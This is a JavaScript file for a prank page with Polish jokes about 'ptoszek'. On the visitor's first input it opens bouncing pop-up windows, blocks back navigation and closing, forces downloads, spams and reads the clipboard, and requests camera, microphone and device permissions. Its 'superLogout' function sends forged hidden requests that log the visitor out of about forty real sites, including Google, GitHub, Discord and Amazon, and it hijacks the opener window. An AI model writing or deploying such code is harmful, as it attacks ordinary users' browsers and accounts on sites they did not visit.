const SCREEN_WIDTH = window.screen.availWidth
const SCREEN_HEIGHT = window.screen.availHeight
const WIN_WIDTH = 480
const WIN_HEIGHT = 260
const VELOCITY = 15
const MARGIN = 10
const TICK_LENGTH = 50

const HIDDEN_STYLE = 'position: fixed; width: 1px; height: 1px; overflow: hidden; top: -10px; left: -10px;'

const ART = [
  `
┊┊ ☆┊┊┊┊☆┊┊☆ ┊┊┊┊┊
┈┈┈┈╭━━━━━━╮┊☆ ┊┊
┈☆ ┈┈┃╳╳╳▕╲▂▂╱▏┊┊
┈┈☆ ┈┃╳╳╳▕▏▍▕▍▏┊┊
┈┈╰━┫╳╳╳▕▏╰┻╯▏┊┊
☆ ┈┈┈┃╳╳╳╳╲▂▂╱┊┊┊
┊┊☆┊╰┳┳━━┳┳╯┊ ┊ ☆┊
  `,
  `
░░▓▓░░░░░░░░▓▓░░
░▓▒▒▓░░░░░░▓▒▒▓░
░▓▒▒▒▓░░░░▓▒▒▒▓░
░▓▒▒▒▒▓▓▓▓▒▒▒▒▓░
░▓▒▒▒▒▒▒▒▒▒▒▒▒▒▓
▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓
▓▒▒▒░▓▒▒▒▒▒░▓▒▒▓
▓▒▒▒▓▓▒▒▒▓▒▓▓▒▒▓
▓▒░░▒▒▒▒▒▒▒▒▒░░▓
▓▒░░▒▓▒▒▓▒▒▓▒░░▓
░▓▒▒▒▓▓▓▓▓▓▓▒▒▓░
░░▓▒▒▒▒▒▒▒▒▒▒▓░░
░░░▓▓▓▓▓▓▓▓▓▓░░░
  `
]

const SEARCHES = [
  'jshop',
  'ptoszek',
  'ptak',
  'kanarek',
  'jaczup'
]

const VIDEOS = [
  'media/videos/jaczup.mp4',
  'media/videos/duck.mp4',
  'media/videos/rickroll.mp4',
  'media/videos/golomb.mp4',
  'media/videos/mushbox.mp4',
  'media/videos/clearmax.mp4',
  'media/videos/freestrona.mp4',
  'media/videos/ajhsdfhjasdbhfjasdfs.mp4',
  'media/videos/v09044g40000cgr968jc77u1t2krb89g.mov',
  'media/videos/intro.mp4',
  'media/videos/szybkakaczka.mp4',
  'media/videos/kaczuszka.mp4',
  'media/videos/gratulacje.mp4'
]

const FILE_DOWNLOADS = [
  'media/images/ptok.jpg',
  'media/images/jaczup.jpg',
  'media/images/jaczupme.jpg',
  'media/images/ptoszek.jpg',
  'media/images/ptakwspodniach.jpg',
  'media/images/kichajacyptoszek.jpg',
  'media/images/lubieptoszki.png',
  'media/images/zimowyptoszek.jpeg',
  'media/images/zlyptok.jpeg',
  'media/images/grubyptok.jpg',
  'media/images/ptokzjajami.jpeg',
  'media/images/ptiszka.jpg',
  'media/images/KEMTOX/ZDJ1 (1).png',
  'media/images/KEMTOX/ZDJ1 (2).png',
  'media/images/KEMTOX/ZDJ1 (3).png',
  'media/images/KEMTOX/ZDJ1 (4).png',
  'media/images/KEMTOX/ZDJ1 (5).png',
  'media/images/KEMTOX/ZDJ1 (6).png',
  'media/images/KEMTOX/ZDJ1 (7).png',
  'media/images/KEMTOX/ZDJ1 (8).png',
  'media/images/KEMTOX/ZDJ1 (9).png',
  'media/images/KEMTOX/ZDJ1 (10).png',
  'media/images/KEMTOX/ZDJ1 (11).png',
  'media/images/KEMTOX/ZDJ1 (12).png',
  'media/images/KEMTOX/ZDJ1 (13).png',
  'media/images/KEMTOX/ZDJ1 (14).png',
  'media/images/KEMTOX/ZDJ1 (15).png',
  'media/images/KEMTOX/ZDJ1 (16).png',
  'media/images/KEMTOX/ZDJ1 (17).png',
  'media/images/KEMTOX/ZDJ1 (18).png',
  'media/images/KEMTOX/ZDJ1 (19).png',
  'media/images/KEMTOX/ZDJ1 (20).png',
  'media/images/KEMTOX/ZDJ1 (21).png',
  'media/images/KEMTOX/ZDJ1 (22).png',
  'media/images/KEMTOX/ZDJ1 (23).png',
  'media/images/KEMTOX/ZDJ1 (24).png',
  'media/images/KEMTOX/ZDJ1 (25).png',
  'media/images/KEMTOX/ZDJ1 (26).png',
  'media/images/KEMTOX/ZDJ1 (27).png',
  'media/images/KEMTOX/ZDJ1 (28).png',
  'media/images/KEMTOX/ZDJ1 (29).png',
  'media/images/KEMTOX/ZDJ1 (30).png',
  'media/images/KEMTOX/ZDJ1 (31).png',
  'media/images/KEMTOX/ZDJ1 (32).png',
  'media/images/KEMTOX/ZDJ1 (33).png',
  'media/images/KEMTOX/ZDJ1 (34).png',
  'media/images/KEMTOX/ZDJ1 (35).png',
  'media/images/KEMTOX/ZDJ1 (36).png',
  'media/images/KEMTOX/ZDJ1 (37).png',
  'media/images/KEMTOX/ZDJ1 (38).png',
  'media/images/KEMTOX/ZDJ1 (39).png',
  'media/images/KEMTOX/ZDJ1 (40).png',
  'media/images/KEMTOX/ZDJ1 (41).png',
  'media/images/KEMTOX/ZDJ1 (42).png',
  'media/images/KEMTOX/ZDJ1 (43).png',
  'media/images/KEMTOX/ZDJ1 (44).png',
  'media/images/KEMTOX/ZDJ1 (45).png',
  'media/images/KEMTOX/ZDJ1 (46).png',
  'media/images/KEMTOX/ZDJ1 (47).png',
  'media/images/KEMTOX/ZDJ1 (48).png',
  'media/images/KEMTOX/ZDJ1 (49).png',
  'media/images/KEMTOX/ZDJ1 (50).png',
  'media/images/KEMTOX/ZDJ1 (51).png',
  'media/images/KEMTOX/ZDJ1 (52).png',
  'media/images/KEMTOX/ZDJ1 (53).png',
  'media/images/KEMTOX/ZDJ1 (54).png',
  'media/images/KEMTOX/ZDJ1 (55).png',
  'media/images/KEMTOX/ZDJ1 (56).png',
  'media/images/KEMTOX/ZDJ1 (57).png',
  'media/images/KEMTOX/ZDJ1 (58).png',
  'media/images/KEMTOX/ZDJ1 (59).png',
  'media/images/KEMTOX/ZDJ1 (60).png',
  'media/images/KEMTOX/ZDJ1 (61).png',
  'media/images/KEMTOX/ZDJ1 (62).png',
  'media/images/KEMTOX/ZDJ1 (63).png',
  'media/images/KEMTOX/ZDJ1 (64).png',
  'media/images/KEMTOX/ZDJ1 (64).png',
  'media/images/KEMTOX/ZDJ1 (65).png',
  'media/images/KEMTOX/ZDJ1 (66).png',
  'media/images/KEMTOX/ZDJ1 (67).png',
  'media/images/KEMTOX/ZDJ1 (68).png',
  'media/images/KEMTOX/ZDJ1 (69).png',
  'media/images/KEMTOX/ZDJ1 (70).png',
  'media/images/KEMTOX/ZDJ1 (71).png',
  'media/images/KEMTOX/ZDJ1 (72).png',
  'media/images/KEMTOX/ZDJ1 (73).png',
  'media/images/KEMTOX/ZDJ1 (74).png',
  'media/images/KEMTOX/ZDJ1 (75).png',
  'media/images/KEMTOX/ZDJ1 (76).png',
  'media/images/KEMTOX/ZDJ1 (77).png',
]

const PHRASES = [
  'Hej. Tu ptoszek. Co u Ciebie',
  'Jak tam?',
  'Co słychać?',
  'Buja?',
]

const LOGOUT_SITES = {
  Discord: ['POST', 'https://discord.com/api/v9/auth/logout', {provider: null, voip_provider: null}],
  Amazon: ['GET', 'https://www.amazon.com/gp/flex/sign-out.html?action=sign-out'],
  DeviantART: ['POST', 'https://www.deviantart.com/users/logout'],
  Dropbox: ['GET', 'https://www.dropbox.com/logout'],
  eBay: ['GET', 'https://signin.ebay.com/ws/eBayISAPI.dll?SignIn'],
  GitHub: ['GET', 'https://github.com/logout'],
  GMail: ['GET', 'https://mail.google.com/mail/?logout'],
  Google: ['GET', 'https://www.google.com/accounts/Logout'],
  Hulu: ['GET', 'https://secure.hulu.com/logout'],
  NetFlix: ['GET', 'https://www.netflix.com/Logout'],
  Skype: ['GET', 'https://secure.skype.com/account/logout'],
  SoundCloud: ['GET', 'https://soundcloud.com/logout'],
  'Steam Community': ['GET', 'https://steamcommunity.com/?action=doLogout'],
  'Steam Store': ['GET', 'https://store.steampowered.com/logout/'],
  Wikipedia: ['GET', 'https://en.wikipedia.org/w/index.php?title=Special:UserLogout'],
  'Windows Live': ['GET', 'https://login.live.com/logout.srf'],
  Wordpress: ['GET', 'https://wordpress.com/wp-login.php?action=logout'],
  Yahoo: ['GET', 'https://login.yahoo.com/config/login?.src=fpctx&logout=1&.direct=1&.done=https://www.yahoo.com/'],
  YouTube: ['POST', 'https://www.youtube.com', { action_logout: '1' }],
  JShop: ['GET', 'https://jshop.partners/panel/logout'],
  Vimeo: ['GET', 'https://vimeo.com/log_out'],
  Tumblr: ['GET', 'https://www.tumblr.com/logout'],
  Allegro: ['GET', 'https://allegro.pl/wyloguj?origin_url=/'],
  OnetMail: ['GET', 'https://authorisation.grupaonet.pl/logout.html?state=logout&client_id=poczta.onet.pl.front.onetapi.pl'],
  InteriaMail: ['GET', 'https://poczta.interia.pl/logowanie/sso/logout'],
  OLX: ['GET', 'https://www.olx.pl/account/logout'],
  Roblox:  ['POST', 'https://auth.roblox.com/v2/logout'],
  ChatGPT: ['GET', 'https://chatgpt.com/auth/logout'],
  Guilded:  ['POST', 'https://www.guilded.gg/api/logout'],
  LinkedIn: ['GET', 'https://www.linkedin.com/m/logout/'],
  Pinterest: ['GET', 'https://www.pinterest.com/logout/'],
  Reddit: ['GET', 'https://www.reddit.com/logout'],
  Spotify: ['GET', 'https://www.spotify.com/logout/'],
  Microsoft: ['GET', 'https://login.microsoftonline.com/common/oauth2/logout'],
  Instagram: ['GET', 'https://www.instagram.com/accounts/logout/'],
  Trello: ['GET', 'https://trello.com/logout'],
  Baidu: ['GET', 'https://passport.baidu.com/?logout'],
  VK: ['GET', 'https://vk.com/exit'],
  StackOverflow: ['GET', 'https://stackoverflow.com/users/logout'],
  Asana: ['POST', 'https://app.asana.com/app/asana/-/logout'],
}

const wins = []

let interactionCount = 0

const veryLongString = repeatStringNumTimes(repeatStringNumTimes('zostałeś zptoszkowany!!1 ',100),1500)

let numSuperLogoutIframes = 0

const isChildWindow = (window.opener && isParentSameOrigin()) ||
  window.location.search.indexOf('child=true') !== -1

const isParentWindow = !isChildWindow

init()

if (isChildWindow) initChildWindow()
else initParentWindow()

function init () {
  confirmPageUnload()

  interceptUserInput(event => {
    interactionCount += 1

    event.preventDefault()
    event.stopPropagation()

    if (event.which !== 0) openWindow()

    startVibrateInterval()
    enablePictureInPicture()
    triggerFileDownload()

    focusWindows()
    copySpamToClipboard()
    speak()
    startTheramin()

    if (event.key === 'Meta' || event.key === 'Control') {
      window.print()
      requestWebauthnAttestation()
      window.print()
      requestWebauthnAttestation()
      window.print()
      requestWebauthnAttestation()
    } else {
      requestPointerLock()

      if (!window.ApplePaySession) {
        requestWebauthnAttestation()
      }
      requestClipboardRead()
      requestMidiAccess()
      requestBluetoothAccess()
      requestUsbAccess()
      requestSerialAccess()
      requestHidAccess()
      requestCameraAndMic()
      requestFullscreen()
    }
  })
}

function initChildWindow () {
  registerProtocolHandlers()
  hideCursor()
  moveWindowBounce()
  startVideo()
  detectWindowClose()
  triggerFileDownload()
  speak()
  rainbowThemeColor()
  animateUrlWithEmojis()

  interceptUserInput(event => {
    if (interactionCount === 1) {
      startAlertInterval()
    }
  })
}

function initParentWindow () {
  showHelloMessage()
  blockBackButton()
  fillHistory()
  startInvisiblePictureInPictureVideo()

  interceptUserInput(event => {
    if (interactionCount === 1) {
      registerProtocolHandlers()
      attemptToTakeoverReferrerWindow()
      hideCursor()
      startVideo()
      startAlertInterval()
      superLogout()
      removeHelloMessage()
      rainbowThemeColor()
      animateUrlWithEmojis()
      speak('To był błąd')
    }
  })
}

function attemptToTakeoverReferrerWindow () {
  if (isParentWindow && window.opener && !isParentSameOrigin()) {
    window.opener.location = `${window.location.origin}/?child=true`
  }
}

function isParentSameOrigin () {
  try {
    return window.opener.location.origin === window.location.origin
  } catch (err) {
    return false
  }
}

function confirmPageUnload () {
  window.addEventListener('beforeunload', event => {
    speak('Please don\'t go!')
    event.returnValue = true
  })
}

function registerProtocolHandlers () {
  if (typeof navigator.registerProtocolHandler !== 'function') return

  const protocolWhitelist = [
    'bitcoin',
    'geo',
    'im',
    'irc',
    'ircs',
    'magnet',
    'mailto',
    'mms',
    'news',
    'ircs',
    'nntp',
    'sip',
    'sms',
    'smsto',
    'ssh',
    'tel',
    'urn',
    'webcal',
    'wtai',
    'xmpp'
  ]

  const handlerUrl = window.location.href + '/url=%s'

  protocolWhitelist.forEach(proto => {
    navigator.registerProtocolHandler(proto, handlerUrl, 'Ptoszek')
  })
}

function requestCameraAndMic () {
  if (!navigator.mediaDevices ||
      typeof navigator.mediaDevices.getUserMedia !== 'function') {
    return
  }

  navigator.mediaDevices.enumerateDevices().then(devices => {
    const cameras = devices.filter((device) => device.kind === 'videoinput')

    if (cameras.length === 0) return
    const camera = cameras[cameras.length - 1]

    navigator.mediaDevices.getUserMedia({
      deviceId: camera.deviceId,
      facingMode: ['user', 'environment'],
      audio: true,
      video: true
    }).then(stream => {
      const track = stream.getVideoTracks()[0]
      const imageCapture = new window.ImageCapture(track)

      imageCapture.getPhotoCapabilities().then(() => {
        track.applyConstraints({ advanced: [{ torch: true }] })
      }, () => { })
    }, () => { })
  })
}

function animateUrlWithEmojis () {
  if (window.ApplePaySession) {
    return
  }
  const rand = Math.random()
  if (rand < 0.33) {
    animateUrlWithBabies()
  } else if (rand < 0.67) {
    animateUrlWithWave()
  } else {
    animateUrlWithMoons()
  }

  function animateUrlWithBabies () {
    const e = ['🏻', '🏼', '🏽', '🏾', '🏿']

    setInterval(() => {
      let s = ''
      let i; let m

      for (i = 0; i < 10; i++) {
        m = Math.floor(e.length * ((Math.sin((Date.now() / 100) + i) + 1) / 2))
        s += '👶' + e[m]
      }

      window.location.hash = s
    }, 100)
  }

  function animateUrlWithWave () {
    setInterval(() => {
      let i; let n; let s = ''

      for (i = 0; i < 10; i++) {
        n = Math.floor(Math.sin((Date.now() / 200) + (i / 2)) * 4) + 4

        s += String.fromCharCode(0x2581 + n)
      }

      window.location.hash = s
    }, 100)
  }

  function animateUrlWithMoons () {
    const f = ['🌑', '🌘', '🌗', '🌖', '🌕', '🌔', '🌓', '🌒']
    const d = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
    let m = 0

    setInterval(() => {
      let s = ''
      let x = 0

      if (!m) {
        while (d[x] === 4) {
          x++
        }

        if (x >= d.length) m = 1
        else {
          d[x]++
        }
      } else {
        while (d[x] === 0) {
          x++
        }

        if (x >= d.length) m = 0
        else {
          d[x]++

          if (d[x] === 8) d[x] = 0
        }
      }

      d.forEach(function (n) {
        s += f[n]
      })

      window.location.hash = s
    }, 100)
  }
}

function requestPointerLock () {
  const requestPointerLockApi = (
    document.body.requestPointerLock ||
    document.body.webkitRequestPointerLock ||
    document.body.mozRequestPointerLock ||
    document.body.msRequestPointerLock
  )

  requestPointerLockApi.call(document.body)
}

function startVibrateInterval () {
  if (typeof window.navigator.vibrate !== 'function') return
  setInterval(() => {
    const duration = Math.floor(Math.random() * 600)
    window.navigator.vibrate(duration)
  }, 1000)

  window.addEventListener('gamepadconnected', (event) => {
    const gamepad = event.gamepad
    if (gamepad.vibrationActuator) {
      setInterval(() => {
        if (gamepad.connected) {
          gamepad.vibrationActuator.playEffect('dual-rumble', {
            duration: Math.floor(Math.random() * 600),
            strongMagnitude: Math.random(),
            weakMagnitude: Math.random()
          })
        }
      }, 1000)
    }
  })
}

function interceptUserInput (onInput) {
  document.body.addEventListener('touchstart', onInput, { passive: false })

  document.body.addEventListener('mousedown', onInput)
  document.body.addEventListener('mouseup', onInput)
  document.body.addEventListener('click', onInput)

  document.body.addEventListener('keydown', onInput)
  document.body.addEventListener('keyup', onInput)
  document.body.addEventListener('keypress', onInput)
}

function startInvisiblePictureInPictureVideo () {
  const video = document.createElement('video')
  video.src = getRandomArrayEntry(VIDEOS)
  video.loop = true
  video.muted = true
  video.style = HIDDEN_STYLE
  video.autoplay = true
  video.play()

  document.body.appendChild(video)
}

function enablePictureInPicture () {
  const video = document.querySelector('video')
  if (document.pictureInPictureEnabled) {
    video.style = ''
    video.muted = false
    video.requestPictureInPicture()
    video.play()
  }
}

function focusWindows () {
  wins.forEach(win => {
    if (!win.closed) win.focus()
  })
}

function openWindow () {
  const { x, y } = getRandomCoords()
  const opts = `width=${WIN_WIDTH},height=${WIN_HEIGHT},left=${x},top=${y}`
  const win = window.open(window.location.pathname, '', opts)

  if (!win) return
  wins.push(win)

  if (wins.length === 2) setupSearchWindow(win)

  win.onunload = function () {
    return false;
  };

  win.addEventListener("beforeunload", function (e) {
    e.preventDefault();
    e.returnValue = "";
  });

  win.onbeforeunload = function () {
    return "";
  };
}

function hideCursor () {
  document.querySelector('html').style = 'cursor: none;'
}

function triggerFileDownload () {
  const fileName = getRandomArrayEntry(FILE_DOWNLOADS)
  const a = document.createElement('a')
  a.href = fileName
  a.download = fileName
  a.click()
}

function speak (phrase) {
  if (phrase == null) phrase = getRandomArrayEntry(PHRASES)
  window.speechSynthesis.speak(new window.SpeechSynthesisUtterance(phrase))
}

function startTheramin () {
  const audioContext = new AudioContext()
  const oscillatorNode = audioContext.createOscillator()
  const gainNode = audioContext.createGain()

  const pitchBase = 50
  const pitchRange = 4000

  const wave = audioContext.createPeriodicWave(
    Array(10).fill(0).map((v, i) => Math.cos(i)),
    Array(10).fill(0).map((v, i) => Math.sin(i))
  )

  oscillatorNode.setPeriodicWave(wave)

  oscillatorNode.connect(gainNode)
  gainNode.connect(audioContext.destination)

  oscillatorNode.start(0)

  const oscillator = ({ pitch, volume }) => {
    oscillatorNode.frequency.value = pitchBase + pitch * pitchRange
    gainNode.gain.value = volume * 3
  }

  document.body.addEventListener('mousemove', event => {
    const { clientX, clientY } = event
    const { clientWidth, clientHeight } = document.body
    const pitch = (clientX - clientWidth / 2) / clientWidth
    const volume = (clientY - clientHeight / 2) / clientHeight
    oscillator({ pitch, volume })
  })
}

function requestClipboardRead () {
  try {
    navigator.clipboard.readText().then(
      data => {
        if (!window.ApplePaySession) {
          window.alert("Successfully read data from clipboard: '" + data + "'")
        }
      },
      () => {}
    )
  } catch {}
}

function requestWebauthnAttestation () {
  try {
    const createCredentialDefaultArgs = {
      publicKey: {
        rp: {
          name: 'Acme'
        },

        user: {
          id: new Uint8Array(16),
          name: 'lolica@jaczup.me',
          displayName: 'Ptoszek Jaczupa'
        },

        pubKeyCredParams: [{
          type: 'public-key',
          alg: -7
        }],

        attestation: 'direct',

        timeout: 60000,

        challenge: new Uint8Array([
          0x8C, 0x0A, 0x26, 0xFF, 0x22, 0x91, 0xC1, 0xE9, 0xB9, 0x4E, 0x2E, 0x17, 0x1A, 0x98, 0x6A, 0x73,
          0x71, 0x9D, 0x43, 0x48, 0xD5, 0xA7, 0x6A, 0x15, 0x7E, 0x38, 0x94, 0x52, 0x77, 0x97, 0x0F, 0xEF
        ]).buffer
      }
    }

    const getCredentialDefaultArgs = {
      publicKey: {
        timeout: 60000,
        challenge: new Uint8Array([
          0x79, 0x50, 0x68, 0x71, 0xDA, 0xEE, 0xEE, 0xB9, 0x94, 0xC3, 0xC2, 0x15, 0x67, 0x65, 0x26, 0x22,
          0xE3, 0xF3, 0xAB, 0x3B, 0x78, 0x2E, 0xD5, 0x6F, 0x81, 0x26, 0xE2, 0xA6, 0x01, 0x7D, 0x74, 0x50
        ]).buffer
      }
    }

    navigator.credentials.create(createCredentialDefaultArgs)
      .then((cred) => {
        const idList = [{
          id: cred.rawId,
          transports: ['usb', 'nfc', 'ble'],
          type: 'public-key'
        }]
        getCredentialDefaultArgs.publicKey.allowCredentials = idList
        return navigator.credentials.get(getCredentialDefaultArgs)
      })
  } catch {}
}

function requestMidiAccess () {
  try {
    navigator.requestMIDIAccess({
      sysex: true
    })
  } catch {}
}

function requestBluetoothAccess () {
  try {
    navigator.bluetooth.requestDevice({
      acceptAllDevices: true
    })
      .then(device => device.gatt.connect())
  } catch {}
}

function requestUsbAccess () {
  try {
    navigator.usb.requestDevice({ filters: [{}] })
  } catch {}
}

function requestSerialAccess () {
  try {
    navigator.serial.requestPort({ filters: [] })
  } catch {}
}

function requestHidAccess () {
  try {
    navigator.hid.requestDevice({ filters: [] })
  } catch {}
}

function moveWindowBounce () {
  let vx = VELOCITY * (Math.random() > 0.5 ? 1 : -1)
  let vy = VELOCITY * (Math.random() > 0.5 ? 1 : -1)

  setInterval(() => {
    const x = window.screenX
    const y = window.screenY
    const width = window.outerWidth
    const height = window.outerHeight

    if (x < MARGIN) vx = Math.abs(vx)
    if (x + width > SCREEN_WIDTH - MARGIN) vx = -1 * Math.abs(vx)
    if (y < MARGIN + 20) vy = Math.abs(vy)
    if (y + height > SCREEN_HEIGHT - MARGIN) vy = -1 * Math.abs(vy)

    window.moveBy(vx, vy)
  }, TICK_LENGTH)
}

function startVideo () {
  const video = document.createElement('video')

  video.src = getRandomArrayEntry(VIDEOS)
  video.autoplay = true
  video.loop = true
  video.style = 'width: 100%; height: 100%;'

  document.body.appendChild(video)
}

function detectWindowClose () {
  window.addEventListener('unload', () => {
    if (!window.opener.closed) window.opener.onCloseWindow(window)
  })
}

function onCloseWindow (win) {
  const i = wins.indexOf(win)
  if (i >= 0) wins.splice(i, 1)
}

function showHelloMessage () {
  const template = document.querySelector('template')
  const clone = document.importNode(template.content, true)
  document.body.appendChild(clone)
}

function removeHelloMessage () {
  const helloMessage = document.querySelector('.hello-message')
  helloMessage.remove()
}

function rainbowThemeColor () {
  function zeroFill (width, number, pad = '0') {
    width -= number.toString().length
    if (width > 0) return new Array(width + (/\./.test(number) ? 2 : 1)).join(pad) + number
    return number + ''
  }

  const meta = document.querySelector('meta.theme-color')
  setInterval(() => {
    meta.setAttribute('content', '#' + zeroFill(6, Math.floor(Math.random() * 16777215).toString(16)))
  }, 50)
}

function repeatStringNumTimes(string, times) {
  var repeatedString = "";
  while (times > 0) {
    repeatedString += string;
    times--;
  }
  return repeatedString;
}

function copySpamToClipboard () {
  clipboardCopy(veryLongString)
}

function clipboardCopy (text) {
  const span = document.createElement('span')
  span.textContent = text
  span.style.whiteSpace = 'pre'

  const iframe = document.createElement('iframe')
  iframe.sandbox = 'allow-same-origin'
  document.body.appendChild(iframe)

  let win = iframe.contentWindow
  win.document.body.appendChild(span)

  let selection = win.getSelection()

  if (!selection) {
    win = window
    selection = win.getSelection()
    document.body.appendChild(span)
  }

  const range = win.document.createRange()
  selection.removeAllRanges()
  range.selectNode(span)
  selection.addRange(range)

  let success = false
  try {
    success = win.document.execCommand('copy')
  } catch (err) {
    console.log(err)
  }

  selection.removeAllRanges()
  span.remove()
  iframe.remove()

  return success
}

function startAlertInterval () {
  setInterval(() => {
    if (Math.random() < 0.5) {
      showAlert()
    } else {
      window.print()
    }
  }, 30000)
}

function showAlert () {
  const randomArt = getRandomArrayEntry(ART)
  const longAlertText = Array(200).join(randomArt)
  window.alert(longAlertText)
}

function requestFullscreen () {
  const requestFullscreen = Element.prototype.requestFullscreen ||
    Element.prototype.webkitRequestFullscreen ||
    Element.prototype.mozRequestFullScreen ||
    Element.prototype.msRequestFullscreen

  requestFullscreen.call(document.body)
}

function superLogout () {
  function cleanup (el, delayCleanup) {
    if (delayCleanup) {
      delayCleanup = false
      return
    }
    el.parentNode.removeChild(el)
  }

  function get (url) {
    const img = document.createElement('img')
    img.onload = () => cleanup(img)
    img.onerror = () => cleanup(img)
    img.style = HIDDEN_STYLE
    document.body.appendChild(img)
    img.src = url
  }

  function post (url, params) {
    const iframe = document.createElement('iframe')
    iframe.style = HIDDEN_STYLE
    iframe.name = 'iframe' + numSuperLogoutIframes
    document.body.appendChild(iframe)

    numSuperLogoutIframes += 1

    const form = document.createElement('form')
    form.style = HIDDEN_STYLE

    let numLoads = 0
    iframe.onload = iframe.onerror = () => {
      if (numLoads >= 1) cleanup(iframe)
      numLoads += 1
    }
    form.action = url
    form.method = 'POST'
    form.target = iframe.name

    for (const param in params) {
      if (Object.prototype.hasOwnProperty.call(params, param)) {
        const input = document.createElement('input')
        input.type = 'hidden'
        input.name = param
        input.value = params[param]
        form.appendChild(input)
      }
    }

    document.body.appendChild(form)
    form.submit()
  }
  for (const name in LOGOUT_SITES) {
    const method = LOGOUT_SITES[name][0]
    const url = LOGOUT_SITES[name][1]
    const params = LOGOUT_SITES[name][2] || {}

    if (method === 'GET') {
      get(url)
    } else {
      post(url, params)
    }

    const div = document.createElement('div')
    div.innerText = `Wylogowywanie się z ${name}...`

    const logoutMessages = document.querySelector('.logout-messages')
    logoutMessages.appendChild(div)
  }
}

function blockBackButton () {
  window.addEventListener('popstate', () => {
    window.history.forward()
  })
}

function fillHistory () {
  for (let i = 1; i < 20; i++) {
    window.history.pushState({}, '', window.location.pathname + '?q=' + i)
  }
  window.history.pushState({}, '', window.location.pathname)
}

function getRandomCoords () {
  const x = MARGIN +
    Math.floor(Math.random() * (SCREEN_WIDTH - WIN_WIDTH - MARGIN))
  const y = MARGIN +
    Math.floor(Math.random() * (SCREEN_HEIGHT - WIN_HEIGHT - MARGIN))
  return { x, y }
}

function getRandomArrayEntry (arr) {
  return arr[Math.floor(Math.random() * arr.length)]
}

function setupSearchWindow (win) {
  if (!win) return
  win.window.location = 'https://www.google.com/search?q=' + encodeURIComponent(SEARCHES[0])
  let searchIndex = 1
  const interval = setInterval(() => {
    if (searchIndex >= SEARCHES.length) {
      clearInterval(interval)
      win.window.location = window.location.pathname
      return
    }

    if (win.closed) {
      clearInterval(interval)
      onCloseWindow(win)
      return
    }

    win.window.location = window.location.pathname
    setTimeout(() => {
      const { x, y } = getRandomCoords()
      win.moveTo(x, y)
      win.window.location = 'https://www.google.com/search?q=' + encodeURIComponent(SEARCHES[searchIndex])
      searchIndex += 1
    }, 500)
  }, 2500)
}
